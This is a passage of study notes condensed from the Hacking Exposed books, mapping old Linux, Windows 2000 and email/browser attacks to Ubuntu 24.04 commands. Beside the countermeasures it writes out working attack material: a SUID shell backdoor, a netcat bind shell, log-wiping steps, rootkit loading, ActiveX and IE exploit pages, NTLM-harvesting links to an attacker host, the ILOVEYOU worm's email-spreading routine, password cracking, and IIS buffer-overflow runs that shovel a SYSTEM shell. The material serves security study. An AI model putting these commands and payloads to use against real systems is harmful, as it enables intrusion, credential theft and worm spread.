echo "/bin/cp /bin/sh /tmp/.sh ; /bin/chmod 4755 /tmp/.sh" >> /etc/rc.d/rc3.d/S99local

# 5. Countermeasure: Lock critical files using Linux extended attributes (Ubuntu 24.04)
sudo chattr +i /etc/passwd /etc/shadow    # Make immutable
sudo chattr +a /var/log/syslog            # Make append-only
```

#### 8. Shell `IFS` (Internal Field Separator) Attacks
By changing the `IFS` environment variable from a space to `/`, a SUID program that calls `system("/bin/...")` parses `/` as a word separator and executes a Trojan `bin` program in the current working directory (`/tmp/bin/bin`):
```csh
#!/bin/csh
# Book Exploit: SunOS 4.1.x loadmodule IFS vulnerability
cd /tmp
mkdir bin
cd bin
cat > bin << EOF
#!/bin/sh
sh -i
EOF
chmod 755 /tmp/bin/bin
setenv IFS /
/openwin/bin/loadmodule /sys/sun4c/OBJ/evqmod-sun4c.o /etc/openwin/modules/evqload
```
```c
/* Jeremy Rauch's Safe C Wrapper Countermeasure to sanitize IFS */
#define EXECPATH "/usr/bin/real/"
main(int argc, char **argv) {
  char pathname[1024];
  if(strlen(EXECPATH) + strlen(argv[0]) + 1 > 1024)
    exit(-1);
  strcpy(pathname, EXECPATH);
  strcat(pathname, argv[0]);
  putenv("IFS= \n\t");
  execv(pathname, argv, argc);
}
```

---

### 2.6 Post-Exploitation: After Hacking Root

#### 1. Rootkits, Trojans, & Integrity Verification
Userland rootkits replace system binaries (`login`, `su`, `telnet`, `ftp`, `passwd`, `netstat`, `ifconfig`, `ls`, `ps`, `ssh`, `find`, `du`, `df`, `sync`, `reboot`, `halt`, `shutdown`) with Trojans that log passwords or spawn hidden backdoors, while hiding attacker files, processes, and network connections.
```bash
# 1. Spawning a background Netcat root backdoor on TCP port 222 (Book)
nohup nc -l -p 222 -nvv -e /bin/sh &
# Attacker connecting to the backdoor:
nc -nvv 24.8.128.204 222

# 2. Verifying binary integrity against a known-good package
# Book (Red Hat RPM):
rpm -Vvp ftp://ftp.redhat.com/pub/redhat/redhat-6.2/i386/RedHat/RPMS/fileutils-4.0-21.i386.rpm
# Ubuntu 24.04 Equivalent (using debsums and sha256sum/md5sum):
sudo debsums -c
md5sum /bin/ls /bin/ps /usr/bin/netstat
```

#### 2. Network Sniffers
Attackers put the Ethernet NIC into **promiscuous mode** to capture cleartext credentials (`telnet`, `ftp`, `pop3`, `snmp`, `http`, `rlogin`) across the local collision domain.
* **Book Sniffers:** `sniffit`, `tcpdump`, `linsniff`, `solsniff`, `dsniff` (includes `arpredirect` to poison ARP caches on switched networks), and `snort`.
* **Detecting Sniffers on Ubuntu 24.04:**
  ```bash
  # Check if any network interface is in PROMISC (Promiscuous) mode on Ubuntu 24.04:
  ip -d link show | grep -i promisc
  # Audit running processes and open files for hidden sniffer logs:
  ps aux
  sudo lsof -i
  ```
* **Countermeasures:** Migrate to switched networks with port security/DAI, use `cpm` / `AntiSniff` / `Sentinel`, and encrypt all traffic with **OpenSSH** and **IPSec** (FreeSWAN / StrongSwan on Ubuntu 24.04).

#### 3. Log Cleaning
Attackers inspect `/etc/syslog.conf` (or `/etc/rsyslog.conf` on Ubuntu 24.04) to locate text logs (`/var/log/messages`, `/var/log/secure`, `/var/log/maillog`, `/var/log/xferlog`) and binary login logs (`/var/log/wtmp`, `/var/log/utmp`, `/var/log/lastlog`), then scrub their footprint using `wzap`, `zap`, `wted`, and shell history tricks:
```bash
# 1. Inspecting and scrubbing binary wtmp login logs with wzap (Book)
who ./wtmp
/opt/wzap
# Enter username to zap from the wtmp: joel
who ./wtmp.out
cp ./wtmp.out /var/log/wtmp

# 2. Disabling shell command history during an active session (Ubuntu 24.04 & Book)
unset HISTFILE; unset SAVEHIST

# 3. Linking .bash_history to /dev/null so no commands are ever recorded
ln -s /dev/null ~/.bash_history
ls -l ~/.bash_history
```

#### 4. Kernel Rootkits (LKMs: `knark` and `adore`)
Unlike userland rootkits that modify binaries on disk (which Tripwire can detect), **Loadable Kernel Module (LKM)** rootkits like **knark** and **adore** hook directly into the running Linux kernel to intercept system calls (`sys_getdents`, `sys_kill`, `sys_read`, `sys_execve`).
* **Knark Utilities:** `hidef` / `unhidef` (hide/unhide files), `ered` (exec-redirection to run Trojan binaries while keeping original binaries intact on disk for Tripwire), `nethide` (hides connections in `/proc/net/tcp` and `/proc/net/udp`), `taskhack` (changes UID/GID of running processes to `0`), `rexec` (executes spoofed UDP remote commands), and `rootme` (instant root shell without SUID).
```bash
# Loading knark and hiding the kernel module with modhide.o (Book)
/sbin/insmod knark.o
/sbin/lsmod
/sbin/insmod modhide.o
/sbin/lsmod

# Escalating to root via knark's rootme
rootme /bin/sh

# Using Teso's 'adore' (ava) LKM controller
./ava
# Usage: ./ava {h,u,r,i,v,U} [file, PID or dummy (for 'U')]

# Countermeasure Script: Detecting hidden knark processes by sending signal 32 (kill -32) to all PIDs
#!/bin/sh
rm -f pid
S=1
while [ $S -lt 10000 ]
do
  if kill -32 $S 2>/dev/null; then
    echo "$S" >> pid
  fi
  S=`expr $S + 1`
done
```
* **Countermeasure:** Use **LIDS (Linux Intrusion Detection System)** (`lidsadm`) to seal the kernel (`CAP_SYS_MODULE`), or on Ubuntu 24.04 set `sudo sysctl -w kernel.modules_disabled=1` to lock LKM loading until reboot.

#### 5. Rootkit Recovery & Incident Response
Never trust the binaries on a compromised host. Use a CD/USB of **statically linked binaries** (`ls`, `ps`, `netstat`, `w`, `finger`, `lsof`, `su`, `grep`, `sh`, `top`, `login`, `df`, `file`, `dd`, `du`) and immediately preserve the three UNIX file timestamps (Access, Modification, Creation/Change) to external media before investigating:
```bash
# Preserve MACB file timestamps before touching files on a suspect system
ls -alRu / > /mnt/usb/timestamp_access.txt
ls -alrc / > /mnt/usb/timestamp_modification.txt
ls -alr  / > /mnt/usb/timestamp_creation.txt
```

---

## PART 3: Hacking the Internet User (Chapter 16)

### 3.1 Malicious Mobile Code (ActiveX & Java)
Client-side attacks target web browsers, email clients, and chat/P2P software used by corporate employees and home users alike.

#### 1. Microsoft ActiveX & "Safe for Scripting" ("Accidental Trojans")
ActiveX controls (`.ocx`) use Authenticode digital signatures, but controls marked **"Safe for Scripting"** (either via `IObjectSafety` or Registry category `{7DD95801-9882-11CF-9FA9-00AA006C42C4}`) execute automatically in Internet Explorer and HTML emails without prompting the user.
* **Georgi Guninski's `Scriptlet.typelib` Exploit:** Uses a pre-installed IE control (`Scriptlet.typelib`) marked safe for scripting to write an executable HTML Application (`guninski.hta`) into the Windows Startup folder upon viewing a webpage or previewing an email:
  ```html
  <object id="scr" classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC">
  </object>
  <SCRIPT>
  scr.Reset();
  scr.Path="C:\\windows\\Start Menu\\Programs\\StartUp\\guninski.hta";
  scr.Doc="<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object><SCRIPT>alert('Written by Georgi Guninski http://www.guninski.com/~joro');wsh.Run('c:\\command.com');</"+"SCRIPT>";
  scr.write();
  </SCRIPT>
  </object>
  ```
* **DilDog's Office 2000 UA (`OUACtrl`) Exploit:** Remotely instantiates the Office 2000 User Assistance ActiveX control, silently clicks the GUI buttons to lower Office Macro Security to "Low," and opens `evil.doc`:
  ```javascript
  var ua;
  function setup() {
    ua = new ActiveXObject("OUACtrl.OUACtrl.1");
    ua.WndClass="OpusApp";
    ua.OfficeApp=0;
    return ua.IsAppRunning();
  }
  function disablemacroprotection() {
    ua.AppActivate();
    ua.ShowDialog(0x0E2B);
    ua.SelectTabSDM(0x13); // Click 'low' button
    ua.SelectTabSDM(1);    // Click 'ok' button
  }
  if(setup()) {
    disablemacroprotection();
    parent.frames["blank"].location="http://.../evil.doc";
  }
  ```
* **Inspecting & Unloading ActiveX Controls (Windows Commands):**
  ```cmd
  dcomcnfg
  oleview
  regsvr32 /u [Control_Name]
  ```
* **Java VM Flaws:**
  * *Netscape JVM Type Confusion (Karsten Sohr)* & *Microsoft JVM Sandbox Flaw*: Check vulnerable Microsoft JVM build numbers (`2000–2438` and `3000–3167`) by running `jview` at the command prompt.
  * *Brown Orifice (Dan Brumleve)*: Exploited Netscape Communicator 4.0–4.74 `java.net.ServerSocket` and `netscape.net.URLInputStream` to turn any victim's browser into an HTTP server sharing local files.

---

### 3.2 Cookie Snarfing, IE Cross-Domain Frame Exploits, & SSL Fraud
* **Cookie Snarfing:** Capturing HTTP `Cookie:` headers over the wire using **SpyNet** (`CaptureNet` + `PeepNet`) or `tcpdump` and replaying the session ID (`cuid=...` or `ASPSessionID=...`) to hijack authenticated sessions:
  ```http
  GET http://www.victim.net/images/logo.gif HTTP/1.0
  Accept: */*
  Referrer: http://www.victim.net/
  Host: www.victim.net
  Cookie: jrunsessionid=96114024278141622; cuid=T0RPMlZXTFRLR1pWTVFISEblahblah
  ```
* **Cookie Stealing via Malicious URL & `IFRAME` (Peacefire / Richard M. Smith):**
  ```html
  <iframe src="http://www.peacefire.org%2fsecurity%2fiecookies%2fshowcookie.html%3f.yahoo.com/"></iframe>
  ```
* **IE Cross-Domain Frame Verification Bypass (Reading Local Files):**
  ```html
  <!-- Andrew Nosenko & Georgi Guninski NavigateComplete2 Local File Read Exploit -->
  <IFRAME ID="I1"></IFRAME>
  <SCRIPT for=I1 event="NavigateComplete2(b)">
  alert("Here is your file:\n"+b.document.body.innerText);
  </SCRIPT>
  <SCRIPT>
  I1.navigate("file://c:/test.txt");
  setTimeout('I1.navigate("file://c:/test.txt")',1000);
  </SCRIPT>
  ```
* **SSL Certificate Validation Bypass (ACROS Security Team):** Netscape < 4.73 only checked the IP address (not DNS name) on subsequent SSL sessions; IE failed to verify the server name or expiration date when an SSL session was initiated inside a hidden `FRAME` or `IMG`.

---

### 3.3 Email Hacking ("Mail Hacking 101")
Because graphical mail clients prevent direct manipulation of raw SMTP/MIME headers, attackers construct raw text **"Mail Hacking Capsules"** and pipe them directly into an open SMTP relay on TCP port 25 using `netcat` (`nc`) and `mpack`.

#### 1. Sending Raw HTML Email & Base64 Attachments from Ubuntu 24.04
```bash
# Step 1: Encode an attachment into Base64 MIME format using mpack (Ubuntu 24.04)
mpack -s "Nasty-gram" -o plant.mim plant.txt

# Step 2: Create the Multipart MIME Mail Hacking Capsule (malicious.txt)
cat << 'EOF' > malicious.txt
helo somedomain.com
mail from: <mallory@malweary.com>
rcpt to: <hapless@victim.net>
data
subject: Read this!
Importance: high
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="_boundary1_"

--_boundary1_
Content-Type: multipart/alternative;
	boundary="_boundary2_"

--_boundary2_
Content-Type: text/html; charset=us-ascii

<HTML>
<h2>Hello World!</h2>
</HTML>

--_boundary2_--

--_boundary1_
Content-Type: application/octet-stream; name="plant.txt"
Content-ID: <5551212>
Content-Transfer-Encoding: base64
Content-Disposition: inline; filename="plant.txt"
Content-MD5: Psn+mcJEv0fPwoEc4OXYTA==

SSBjb3VsZGEgaGFja2VkIHlhIGJhZCANCg==

--_boundary1_--
.
quit
EOF

# Step 3: Pipe the capsule through Netcat to an SMTP server (Book & Ubuntu 24.04)
# Book (Windows): type malicious.txt | nc -vv mail.openrelay.net 25
# Ubuntu 24.04:
cat malicious.txt | nc -vv mail.openrelay.net 25
```

#### 2. Executing Arbitrary Code via Email Preview Pane
* **MS Access `.mdb` Auto-Execution (Bypasses Disabled ActiveX! - MS00-049):**
  Embedding `<OBJECT data="http://www.guninski.com/db3.mdb" id="d1"></OBJECT>` inside an HTML email causes IE/Outlook to download and launch the remote Access database (and its internal VBA macros) even when ActiveX is completely disabled.
* **Nonzero ActiveX `CLSID` Local File Execution (Weld Pond & DilDog):**
  ```html
  <HTML><BODY>
  <OBJECT CLASSID='CLSID:10000000-0000-0000-0000-000000000000'
  CODEBASE='c:\windows\calc.exe'></OBJECT>
  </BODY></HTML>
  ```
* **Outlook/OE Date Field GMT Buffer Overflow (`INETCOMM.DLL` - MS00-043):**
  Overflows when downloading a message via POP3/IMAP4 before the user even previews it:
  ```text
  Date: Sun, 7 May 2000 11:20:46 +[~1000 bytes + exploit shellcode]
  ```
* **MIME Execution via Mislabeled `audio/x-wav` & `cid:` (Juan Carlos García Cuartango - MS01-020):**
  Disguises a batch/executable file (`hello.bat`) as `Content-Type: audio/x-wav` with `Content-ID: <THE-CID>` and auto-executes it via `<iframe src=3Dcid:THE-CID height=3D0 width=3D0></iframe>`. Can be paired with `passdump` to dump logged-on Windows passwords to `%systemroot%\pass.txt`.
* **Eudora 5.0.2 Hidden Attachment Execution (`YOU!DORA`):**
  Uses two inline MIME attachments (`You!DORA.html` and `malware.exe`) and references their `cid:` in an `IFRAME` to auto-launch `malware.exe` from Eudora's embedded folder.

#### 3. Outlook Address Book Worms (`ILOVEYOU` VBScript)
```vbscript
' Complete ILOVEYOU Worm Email Propagation Subroutine from Book
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
  set a=mapi.AddressLists(ctrlists)
  x=1
  regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
  if (regv="") then
    regv=1
  end if
  if (int(a.AddressEntries.Count)>int(regv)) then
    for ctrentries=1 to a.AddressEntries.Count
      malead=a.AddressEntries(x)
      regad=""
      regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
      if (regad="") then
        set male=out.CreateItem(0)
        male.Recipients.Add(malead)
        male.Subject = "ILOVEYOU"
        male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
        male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
        male.Send
        regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
      end if
      x=x+1
    next
    regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
  else
    regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
  end if
next
Set out=Nothing
Set mapi=Nothing
end sub
```
* **Countermeasures:** Install the Outlook 2000 SR-1 Security Update (Object Model Guard) and Cigital's `JustBeFriends.dll`.

#### 4. File Attachment Tricks & Writing to Disk Without User Intervention
* **Shell Scrap Files (`.shs` / `.shb`):** Windows hides the `.shs` extension even when "Show file extensions" is enabled because of the Registry key `HKEY_CLASSES_ROOT\ShellScrap\NeverShowExt` (and `HKLM\SOFTWARE\Classes\DocShortcut`). Used by the `LifeChanges` / `LIFE_STAGES.TXT.SHS` worm. Countermeasure: Delete `NeverShowExt` and `shscrap.dll`.
* **Padding Extensions with Spaces:** `freemp3.doc   [150 spaces]   .exe` hides the trailing `.exe` in the mail reader UI.
* **Hijacking Excel/PowerPoint `SaveAs` Function (MS00-049):**
  ```html
  <object data="http://www.guninski.com/Book1.xla" id="sh1" width=0 height=0></object>
  <SCRIPT>
  function f() {
    fn="D:\\test\\georgi-xla.hta";
    sh1.object.SaveAs(fn,6);
    alert(fn+" successfully written");
  }
  setTimeout("f()",5000);
  </SCRIPT>
  ```
* **Force-Feeding Attachments (`malware.com`) & `IFRAME` + `.CHM` Help File Execution (Guninski #9):**
  Flushes an attached compiled help file (`abcde.chm`) into the Windows `TEMP` folder by referencing its MIME `cid:` in an `IFRAME`, and executes it via `window.showHelp()`:
  ```html
  <IFRAME align=3Dbaseline alt=3D"" border=3D0 hspace=3D0 src=3D"cid:5551212"></IFRAME>
  <SCRIPT>
  setTimeout('window.showHelp("c:/windows/temp/abcde.chm");',1000);
  setTimeout('window.showHelp("c:/temp/abcde.chm");',1000);
  setTimeout('window.showHelp("C:/docume~1/admini~1/locals~1/temp/abcde.chm");',1000);
  </SCRIPT>
  ```

#### 5. Invoking Outbound Client Connections (SMB & Telnet NTLM Harvesting)
* **Redirecting SMB Authentication (`file://`):** Forces the victim's Windows machine to initiate an outbound SMB connection (TCP 139/445) and automatically send the user's LM/NTLM challenge-response hashes to an attacker's `SMBCapture` or `SMBRelay` listener (or `impacket-smbserver` / `responder` on Ubuntu 24.04):
  ```html
  <html>
  <img src=file://attacker_server/null.gif height=1 width=1></img>
  </html>
  ```
* **Harvesting NTLM Credentials via `telnet://` (DilDog - MS00-067):** Windows 2000's `telnet` client attempts NTLM authentication by default over any port specified in a `telnet://` URL:
  ```html
  <html>
  <frameset rows="100%,*">
  <frame src=about:blank>
  <frame src=telnet://evil.ip.address:port>
  </frameset>
  </html>
  ```
  * **Countermeasure:** Block outbound TCP 139, 445, and 23 at the firewall; enforce `Send NTLMv2 Response Only` and `Require SMB Packet Signing`; and disable NTLM in the Windows 2000 telnet client:
    ```cmd
    telnet
    Microsoft Telnet> unset ntlm
    Microsoft Telnet> quit
    ```

---

## PART 4: Linux Password Cracking & Shadow Suite (Chapter 9 of *Hacking Linux Exposed*)

### 4.1 How Passwords Work in Linux
#### 1. Structure of `/etc/passwd` (7 Colon-Separated Fields)
```text
jdoe:2bTlcMw8zeSdw:500:500:John Doe:/home/jdoe:/bin/bash
```
1. Username (`jdoe`)
2. Encrypted password hash (`2bTlcMw8zeSdw` — or `x` when shadowed)
3. User ID / UID (`500`)
4. Group ID / GID (`500`)
5. GECOS / Comment field (`John Doe`)
6. Home directory (`/home/jdoe`)
7. Default login shell (`/bin/bash`)

#### 2. Linux Encryption & Hashing Algorithms
* **`rot13`:** Rotates alphabetic characters by 13 positions (`Hello, world` → `Uryyb, jbeyq`). Reversible, not a one-way function.
* **DES (`crypt(3)`):** Limits passwords to 8 characters (56-bit key) and uses a 2-character **salt** chosen from `[a-zA-Z0-9./]` (64^2 = 4096 possible salts) to produce a 13-character hash where the first 2 characters are the salt itself.
* **MD5 (`$1$`):** Supports infinite password lengths and a much larger keyspace, beginning with `$1$<salt>$<hash>`. (Note: Ubuntu 24.04 defaults to **`yescrypt` (`$y$`)** or **SHA-512 (`$6$`)**, which are even stronger).

```perl
#!/usr/bin/perl
# Book Script 1: crypt.pl - Generate DES crypt(3) password hashes
use strict;
print 'Please enter your salt: ';
my $salt = <STDIN>;
chomp $salt;
print 'Please enter your password: ';
my $passwd = <STDIN>;
chomp $passwd;
print 'The result is: ', crypt($passwd, $salt), "\n";
```

```perl
#!/usr/bin/perl -w
# Book Script 2: md5.pl - Generate MD5 digests (On Ubuntu 24.04, uses Digest::MD5)
use strict;
use Digest::MD5; # Book used legacy 'use MD5;'
print 'Please enter your password: ';
my $passwd = <STDIN>;
chomp $passwd;
my $md5 = Digest::MD5->new;
$md5->add($passwd);
my $digest = $md5->digest();
print("Result is ", unpack("H*", $digest), "\n");
```

---

### 4.2 Password Cracking Programs (`Crack 5.0a` & `John the Ripper`)

#### 1. Alec Muffett's `Crack 5.0a` (Book Commands)
```bash
# Unpack and configure Crack 5.0a for Linux MD5/glibc crypt()
tar xzf crack5.0.tar.gz
cd c50a
mv src/libdes src/libdes,orig
cd src/util
cp -f elcid.c,bsd elcid.c
cd ../..
# In ./Crack script, uncomment: CC=gcc, CFLAGS="-g -O2 -Wall $C5FLAGS", LIBS=-lcrypt

# Compile Crack and build dictionaries
./Crack -makeonly
./Crack -makedict

# Extract NIS or Shadow passwords into a single crackable file
ypcat passwd > passwd.txt
sudo scripts/shadmrg.sv > passwd.txt
sudo chmod 600 passwd.txt

# Run Crack, monitor progress, and view cracked results
./Crack passwd.txt
ps ax | grep crack
tail -f run/Dmachine1.1572
top
./Crack -network passwd.txt   # Distributed cracking using conf/network.conf
./Crack -mail passwd.txt      # Email nastygram to users with cracked passwords
./Reporter                    # Display all cracked passwords (-quiet for concise output)
make tidy                     # Clean up residual cracked data
```

#### 2. Solar Designer's `John the Ripper` (Book & Ubuntu 24.04 Commands)
*Note: Other crackers mentioned in the book include **Viper** (Windows brute-forcer checking up to 3 × 10^21 combinations for 12-char alphanumeric strings) and **Slurpie** (distributed Linux cracker).*
```bash
# 1. Book Compilation from Source (or simply 'sudo apt install john' on Ubuntu 24.04)
tar xzf john-1.6.tar.gz
cd john-1.6/src
make linux-x86-any-elf

# 2. Merge /etc/passwd and /etc/shadow using 'unshadow' (Works natively on Ubuntu 24.04)
sudo unshadow /etc/passwd /etc/shadow > passwd.txt
sudo chmod 600 passwd.txt

# 3. Run John the Ripper and manage sessions
john passwd.txt
john -restore                        # Resume an interrupted session
john -show passwd.txt                # Show all cracked passwords
john -show -users:jdoe passwd.txt    # Show cracked password for user 'jdoe'

# 4. John the Ripper Cracking Modes
john -wordfile:/usr/share/dict/words passwd.txt   # Wordlist mode (Book: /usr/dict/words)
john -wordfile -stdin passwd.txt                  # Read words from stdin
john -single passwd.txt                           # Single crack mode (uses GECOS/login info)
john -incremental passwd.txt                      # Incremental mode (full brute force)
john -external:MODE passwd.txt                    # External C-like filter mode

# 5. Notify users whose passwords were cracked
./mailer passwd.txt
```

---

### 4.3 Shadow Passwords (`/etc/shadow`), Apache, & PAM

#### 1. Structure of `/etc/shadow` (9 Colon-Separated Fields)
```text
jdoe:2bTlcMw8zeSdw:11195:0:99999:7:-1:-1:134549452
```
1. Username (`jdoe`)
2. Encrypted password hash (`!` or `!!` or `*` means locked account)
3. Last password change (days since Jan 1, 1970)
4. Minimum days between password changes (`0`)
5. Maximum days password is valid (`99999`)
6. Warning days before expiration (`7`)
7. Inactive days after expiration before disabling account (`-1`)
8. Expiration date in days since Jan 1, 1970 (`-1`)
9. Reserved field

#### 2. Shadow Password & User Management Command Suite (Ubuntu 24.04)
```bash
# Check integrity of /etc/passwd and convert to/from shadow passwords
sudo pwck
sudo pwconv
sudo pwunconv

# Manage password expiration policies with 'chage'
# chage [-m mindays] [-M maxdays] [-d lastday] [-I inactive] [-E expiredate] [-W warndays] user
sudo chage -M 90 jdoe      # Force user 'jdoe' to change password every 90 days
sudo chage -l jdoe         # List current expiration settings on Ubuntu 24.04

# User and Group Management Suite
sudo useradd -m newuser
sudo passwd newuser
sudo usermod -aG sudo newuser
sudo userdel -r newuser
sudo groupadd secops
sudo gpasswd -a jdoe secops
sudo groupmod -n netsec secops
sudo groupdel netsec

# Apache Web Server HTTP Authentication Password File Creation
htpasswd -c /etc/apache2/.htpasswd al
htpasswd --help
```

#### 3. Pluggable Authentication Modules (PAM) & Random Password Generator
In the book, `/etc/pam.d/passwd` uses `pam_cracklib.so` (`password required /lib/security/pam_cracklib.so retry=3`). On **Ubuntu 24.04**, this is configured in `/etc/pam.d/common-password` using `pam_pwquality.so`.

```perl
#!/usr/bin/perl -w
# Book Script 3: passwd_generator.pl - Generate Bomb-Proof Random Passwords
use strict;
my @chars = (33..91,93..126);
my $num_chars = @chars;
my $length;
my $funny = '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~';

print "Enter number of characters in your password: ";
chomp($length = <STDIN>);
die "Length must be greater than 6!" if $length <= 5;

while (1) {
  my $password = '';
  foreach (1..$length) {
    $password .= chr($chars[int(rand($num_chars))]);
  }
  if ($password =~ /[a-z]/ and $password =~ /[A-Z]/ and
      $password =~ /[0-9]/ and $password =~ /[$funny]/) {
    print $password, "\n";
    exit;
  }
}
```

---

## PART 5: Windows 2000 Security Architecture (Chapter 2 of *Hacking Exposed Windows 2000*)

### 5.1 Core Architecture & Security Principles
* **Primary Attacker Goal:** Execute commands in the context of the most privileged user account (`LocalSystem` / `SYSTEM` or `Administrator` locally; `Domain Admins` or `Enterprise Admins` on a domain/forest).
* **Security Reference Monitor (SRM):** Runs in kernel mode and validates every user-mode access request by comparing the user's **Access Token** (created by `Winlogon` and `LSASS` upon login) against the object's **Discretionary Access Control List (DACL)**. Device drivers run in kernel mode and bypass the SRM.
* **Built-In Accounts:** `SYSTEM` (`LocalSystem`), `Administrator` (RID `500`), `Guest` (RID `501`), `IUSR_machinename` (anonymous IIS account, member of Guests), `IWAM_machinename` (out-of-process IIS Web Application Manager account, member of Guests), `TSInternetUser`, and `krbtgt` (Kerberos KDC account).
* **Special Identities:** `Everyone` (`S-1-1-0`), `INTERACTIVE` (`S-1-2-0`, required for local privilege escalation exploits like `PipeUpAdmin`), and `Network`.
* **SAM, Active Directory, & SYSKEY:**
  * Standalone systems store hashes in `%systemroot%\system32\config\sam`; Domain Controllers store them in `%systemroot%\ntds\ntds.dit`.
  * **SYSKEY** adds 128-bit encryption to password hashes in three modes: **Mode 1** (key stored in Registry, enabled by default in Win2K), **Mode 2** (boot password required), and **Mode 3** (boot floppy required).
* **Why the Forest (Not the Domain) Is the Security Boundary:** All domains in a Windows 2000 forest share a two-way transitive trust, a common Global Catalog, and a shared `Configuration` container in Active Directory. A `Domain Admin` in *any* child domain can take ownership of and modify the `Configuration` container, replicating changes to all Domain Controllers across the entire forest.

### 5.2 SIDs, RIDs, Tokens, & Network Authentication Commands
* **SID Structure:** `S-1-5-21-1507001333-1204550764-1011284298-500`
  * Revision (`1`), Identifier Authority (`5` for NT/2000), Subauthority values (`21-...` unique to the machine/domain), and **Relative Identifier / RID** (`500` = always true `Administrator`, `501` = `Guest`, `1000+` = standard users).
* **Network Authentication Protocols:** Uses an 8-byte challenge/response via **LANMan (LM)** (weak, easily cracked), **NTLM**, **NTLMv2**, or **Kerberos v5** (used only intra-forest when referenced by hostname/DNS name rather than IP address).

#### Book Commands & Ubuntu 24.04 Equivalents (Windows Architecture)
```cmd
:: 1. Specifying Domain/Computer Context with 'net use' (Book)
:: Fails if logged in locally as Administrator or running as SYSTEM without domain prefix:
net use \\192.168.234.44\ipc$ password /u:Administrator
:: Succeeds by explicitly specifying domain or remote computer name:
net use \\192.168.234.44\ipc$ password /u:domain\Administrator

:: 2. Enumerating SIDs and Usernames by RID (user2sid / sid2user)
user2sid Administrator
sid2user 5 21 1507001333 1204550764 1011284298 500

:: 3. Inspecting Current Access Token SIDs and Privileges
whoami /all
```

```bash
# Ubuntu 24.04 Equivalents for Remote Windows SMB & SID Enumeration:
# 1. Connect to IPC$ share with domain context:
smbclient //192.168.234.44/IPC$ -U "domain/Administrator%password"

# 2. Enumerate SIDs and brute-force RIDs (500, 501, 1000+) remotely from Ubuntu 24.04:
impacket-lookupsid domain/user:password@192.168.234.44
rpcclient -U "" -N 192.168.234.44 -c "lookupnames Administrator"
rpcclient -U "" -N 192.168.234.44 -c "lookupsids S-1-5-21-1507001333-1204550764-1011284298-500"
```

---

## PART 6: Hacking IIS 5 and Web Applications (Chapter 10 of *Hacking Exposed Windows 2000*)

### 6.1 IIS Hacking Basics & Hex URL Encoding
* **HTTP, CGI, ASP, & ISAPI:**
  * CGI: `http://www.victim.com/scripts/cgi.exe?variable1+variable2`
  * ASP: `http://www.victim.com/scripts/script.asp?variable1=X&variable2=Y`
  * ISAPI: `http://www.victim.com/isapi.dll?variable1&variable2`
* **Key Hexadecimal URL Encodings (Table 10-1):**
  * `[space]` = `%20` | `+` = `%2B` | `.` = `%2E` | `/` = `%2F` | `:` = `%3A` | `?` = `%3F` | `\` = `%5C`
* **Compaq Insight Manager (Port 2301) Dot-Dot-Slash SAM Retrieval:**
  ```http
  http://victim.com:2301/../../../winnt/repair/sam._
  ```

#### Basic Web Hacking with `netcat` (Book & Ubuntu 24.04)
```bash
# Create an HTTP request file (get.txt) with two trailing carriage-return/line-feeds
printf "GET / HTTP/1.0\r\n\r\n" > get.txt

# Pipe the request to the target web server using Netcat (Ubuntu 24.04)
nc -vv www.victim.com 80 < get.txt
```
```cmd
:: Book Windows Batch Automation Script (webhack.bat)
@echo off
if '%1'=='' goto :syntax
if '%2'=='' goto :syntax
nc -vv %1 80 < %2
goto :eof
:syntax
echo usage: webhack ^<target^> ^<input_file^>
:eof
```

---

### 6.2 IIS 5 Remote Buffer Overflows

#### 1. Internet Printing Protocol (IPP) `.printer` Buffer Overflow (`msw3prt.dll` - MS01-023)
Sending a `Host:` header of ~420 bytes to any `.printer` URL overflows `C:\WINNT\System32\msw3prt.dll`, which runs inside `inetinfo.exe` as **`SYSTEM`**.
```http
GET /NULL.printer HTTP/1.0
Host: [~420-byte buffer]
```
```bash
# Compiling and Running dark spyrit's 'jill.c' Exploit on Ubuntu 24.04:
# Step 1: Compile jill.c natively with gcc on Ubuntu 24.04
gcc -o jill jill.c

# Step 2: Start a Netcat listener on your Ubuntu 24.04 machine (port 2002)
nc -vv -l -p 2002

# Step 3: Launch jill against the IIS 5 server (192.168.234.222:80) shoveling shell to 192.168.234.250:2002
./jill 192.168.234.222 80 192.168.234.250 2002

# Step 4: In your listener window, press ENTER, verify SYSTEM privileges, and ALWAYS type 'exit' gracefully!
whoami
# Output: NT AUTHORITY\SYSTEM
exit
```

#### 2. Indexing Services `.ida`/`.idq` Buffer Overflow (`idq.dll` - MS01-033 & Code Red Worm)
Sending an overlong URL parameter (~240 bytes) to `.ida` or `.idq` overflows `C:\WINNT\System32\idq.dll` using a heap spray ("forceful heap violation"), granting `SYSTEM` privileges.
```http
GET /null.ida?[~240-byte buffer]=X HTTP/1.1
Host: [arbitrary_value]

# Code Red Worm IIS Log Signature:
GET /default.ida?NNNNNNNNNNNN...[224 N's]...%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a
```
* **Code Red Worm Mechanics:** Memory-resident; spawns 100 threads; checks for `%systemdrive%\notworm` (goes dormant if found); defaces English Win2K websites with `"Welcome to http://www.worm.com! Hacked By Chinese!"` for 10 hours; floods `198.137.240.9` (`www.whitehouse.gov`) between the 20th and 27th of each month.

#### 3. FrontPage 2000 Server Extensions (FPSE) Buffer Overflow (`fp30reg.dll` / `fp4areg.dll` - MS01-035)
